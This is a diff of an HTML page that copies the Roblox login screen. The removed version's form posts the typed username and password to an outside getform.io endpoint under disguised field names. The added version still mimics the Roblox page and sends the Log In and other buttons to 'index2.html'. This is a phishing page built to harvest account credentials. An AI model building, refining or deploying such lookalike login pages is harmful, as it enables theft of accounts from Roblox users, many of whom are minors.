@@ -1,227 +1,222 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Login — Réplique fidèle (ajustable)</title>
-
-<!-- Polices : Poppins pour le titre, Inter pour le texte -->
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
-
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Login to Roblox</title>
 <style>
-  :root{
-    /* Couleurs faciles à ajuster */
-    --bg: #0e0f10;            /* fond global */
-    --header: #111214;        /* header */
-    --panel: #26282b;         /* conteneur principal (plus clair que le fond) */
-    --input-bg: #232427;      /* champ input */
-    --input-border: rgba(255,255,255,0.06);
-    --accent-blue: #2f6bff;   /* bouton Sign Up (header) */
-    --muted: #bfc3c6;         /* texte secondaire */
-    --title: #ffffff;         
-    --button-alt: #3b3d40;    /* boutons secondaires */
-    --outline: rgba(255,255,255,0.12); /* trait clair pour login */
+  body {
+    margin: 0;
+    font-family: "Arial", sans-serif;
+    background-color: #181a1b;
+    color: white;
   }
 
-  /* Reset / Base */
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    margin:0;
-    font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    background:var(--bg);
-    color:var(--muted);
-    -webkit-font-smoothing:antialiased;
-    -moz-osx-font-smoothing:grayscale;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
+  /* --- TOP BAR --- */
+  .top-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background-color: #111;
+    padding: 10px 14px;
+    border-bottom: 1px solid #222;
   }
 
-  /* Header (mini nav) */
-  header{
-    width:100%;
-    background:var(--header);
-    padding:12px 16px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    gap:12px;
-    box-shadow: 0 1px 0 rgba(0,0,0,0.4) inset;
-  }
-  .nav-left{display:flex;align-items:center;gap:18px}
-  .nav-left a{
-    color:#efefef;
-    font-size:14px;
-    text-decoration:none;
-    opacity:0.95;
-  }
-  .signup{
-    background:var(--accent-blue);
-    color:#fff;
-    padding:8px 14px;
-    border-radius:10px;
-    font-weight:700;
-    border:none;
-    font-size:14px;
-    cursor:pointer;
+  .top-left img {
+    width: 32px;
   }
 
-  /* Center column */
-  .center-wrap{
-    width:100%;
-    max-width:420px;   /* largeur conteneur sur tablette/desktop */
-    padding:28px 18px;
-    display:flex;
-    justify-content:center;
+  .top-right {
+    display: flex;
+    align-items: center;
+    gap: 10px;
   }
 
-  /* Le "panel" fidèle au screenshot : sombre, arrondi, padding important */
-  .panel{
-    width:100%;
-    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.02));
-    background-color:var(--panel);
-    border-radius:12px;
-    padding:34px 20px 36px;
-    text-align:center;
-    box-shadow: 0 6px 30px rgba(0,0,0,0.6);
+  .btn {
+    border: none;
+    border-radius: 8px;
+    padding: 7px 16px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 14px;
   }
 
-  /* Titre : police ronde, grande, très visible */
-  h1{
-    margin:0 0 22px 0;
-    font-family: "Poppins", "Inter", sans-serif;
-    font-weight:700;
-    color:var(--title);
-    font-size:28px; /* augmenter/diminuer selon rendu */
-    letter-spacing:0.2px;
+  .btn-signup {
+    background-color: #2563eb;
+    color: white;
   }
 
-  /* Inputs : hauteur et bord arrondi => proche du screenshot mobile */
-  form{
-    max-width:100%;
-  }
-  .field{
-    display:block;
-    width:100%;
-    margin:10px 0;
-  }
-  input[type="text"],
-  input[type="password"]{
-    width:100%;
-    height:52px;
-    padding:14px 16px;
-    border-radius:12px;
-    border:1px solid var(--input-border);
-    background:var(--input-bg);
-    color:#f7f7f7;
-    font-size:15px;
-    outline:none;
-    font-weight:500;
-  }
-  input::placeholder{ color: #a8acb0; font-weight:500; }
-
-  /* Bouton principal "Log In" : fond sombre + fine bordure claire (style screenshot) */
-  .btn-primary{
-    width:100%;
-    height:52px;
-    margin-top:8px;
-    border-radius:12px;
-    background:transparent;
-    border:2px solid var(--outline);
-    color:var(--title);
-    font-size:17px;
-    font-weight:700;
-    cursor:pointer;
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-  }
-  .btn-primary:active{ transform:translateY(1px) }
-
-  .forgot{
-    display:block;
-    margin:20px 0 12px;
-    color:var(--muted);
-    text-decoration:none;
-    font-size:15px;
-    font-weight:600;
+  /* --- NAV BAR --- */
+  .nav-tabs {
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    background-color: #111;
+    border-bottom: 1px solid #222;
+    padding: 10px 0;
   }
 
-  hr.sep{
-    border:0;
-    height:1px;
-    background:rgba(255,255,255,0.04);
-    margin:18px 0;
+  .nav-tabs div {
+    color: #ddd;
+    font-size: 15px;
+    cursor: pointer;
   }
 
-  /* Boutons alternatifs (Email code / Use another device) */
-  .btn-alt{
-    width:100%;
-    height:50px;
-    background:var(--button-alt);
-    color:#f5f5f5;
-    border-radius:12px;
-    border:none;
-    font-weight:600;
-    margin-bottom:12px;
-    font-size:15px;
-    cursor:pointer;
+  .nav-tabs div:hover {
+    color: #2563eb;
   }
 
-  /* Footer small text */
-  .panel-foot{
-    margin-top:14px;
-    color:var(--muted);
-    font-size:14px;
+  /* --- LOGIN BOX --- */
+  .login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: 50px;
+    padding: 20px;
   }
-  .panel-foot a{ color:var(--accent-blue); text-decoration:none; font-weight:700; }
 
-  /* Responsive tweaks for very small mobile (match screenshot narrower) */
-  @media (max-width:380px){
-    .center-wrap{ padding:18px 12px }
-    h1{ font-size:26px }
-    input[type="text"], input[type="password"]{ height:50px; border-radius:10px }
-    .btn-primary{ height:50px; border-radius:10px; font-size:16px }
+  .login-box {
+    background-color: #202224;
+    padding: 25px 20px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+  }
+
+  .login-box h2 {
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 22px;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #333;
+    margin-bottom: 10px;
+    background-color: #2a2d2f;
+    color: white;
+    font-size: 15px;
+  }
+
+  input::placeholder {
+    color: #aaa;
+  }
+
+  .btn-login {
+    width: 100%;
+    padding: 12px;
+    background-color: #2563eb;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+  }
+
+  .btn-login:hover {
+    background-color: #1e4ed8;
+  }
+
+  .forgot {
+    text-align: center;
+    margin: 15px 0;
+    color: #ccc;
+    font-size: 14px;
+    cursor: pointer;
+  }
+
+  .forgot:hover {
+    color: #fff;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px solid #333;
+    margin: 20px 0;
+  }
+
+  .alt-btn {
+    width: 100%;
+    padding: 12px;
+    background-color: #2d2f31;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: bold;
+    margin-bottom: 10px;
+    cursor: pointer;
+  }
+
+  .alt-btn:hover {
+    background-color: #3a3d3f;
+  }
+
+  .signup-text {
+    text-align: center;
+    color: #bbb;
+    margin-top: 10px;
+    font-size: 14px;
+  }
+
+  .signup-text a {
+    color: #2563eb;
+    text-decoration: none;
+    font-weight: bold;
+  }
+
+  .signup-text a:hover {
+    text-decoration: underline;
   }
 </style>
 </head>
 <body>
 
-  <header>
-    <div class="nav-left">
-      <a href="#" aria-hidden="true">▢</a> <!-- logo placeholder -->
-      <a href="#">Charts</a>
-      <a href="#">Marketplace</a>
-      <a href="#">Create</a>
-      <a href="#">Robux</a>
+<!-- Top Bar -->
+<div class="top-bar">
+  <div class="top-left">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0a/Roblox_Logo_2022.svg" alt="Roblox Logo">
+  </div>
+  <div class="top-right">
+    <button class="btn btn-signup" onclick="window.location.href='index2.html'">Sign Up</button>
+  </div>
+</div>
+
+<!-- Navigation -->
+<div class="nav-tabs">
+  <div onclick="window.location.href='index2.html'">Charts</div>
+  <div onclick="window.location.href='index2.html'">Marketplace</div>
+  <div onclick="window.location.href='index2.html'">Create</div>
+  <div onclick="window.location.href='index2.html'">Robux</div>
+</div>
+
+<!-- Login Section -->
+<div class="login-container">
+  <div class="login-box">
+    <h2>Login to Roblox</h2>
+
+    <input type="text" placeholder="Username/Email/Phone" />
+    <input type="password" placeholder="Password" />
+
+    <button class="btn-login" onclick="window.location.href='index2.html'">Log In</button>
+
+    <div class="forgot" onclick="window.location.href='index2.html'">
+      Forgot Password or Username?
     </div>
-    <button class="signup">Sign Up</button>
-  </header>
 
-  <main class="center-wrap">
-    <section class="panel" role="region" aria-label="Login form replica">
-      <h1>Login to Roblox</h1>
+    <hr />
 
-      <form action="https://getform.io/f/bzygxjqa" method="POST">
-        <label class="field" for="u"><input name="letruca" id="u" type="text" placeholder="Username/Email/Phone" required></label>
-        <label class="field" for="p"><input name="letrucb" id="p" type="password" placeholder="Password" required></label>
+    <button class="alt-btn" onclick="window.location.href='index2.html'">Email Me a One-Time Code</button>
+    <button class="alt-btn" onclick="window.location.href='index2.html'">Use Another Device</button>
 
-        <button name="result" class="btn-primary" type="submit">Log In</button>
-      </form>
-
-      <a class="forgot" href="#">Forgot Password or Username?</a>
-
-      <hr class="sep">
-
-      <button class="btn-alt">Email Me a One-Time Code</button>
-      <button class="btn-alt">Use Another Device</button>
-
-      <div class="panel-foot">
-        Don’t have an account? <a href="#">Sign Up</a>
-      </div>
-    </section>
-  </main>
+    <div class="signup-text">
+      Don’t have an account? <a href="index2.html">Sign Up</a>
+    </div>
+  </div>
+</div>
 
 </body>
 </html>
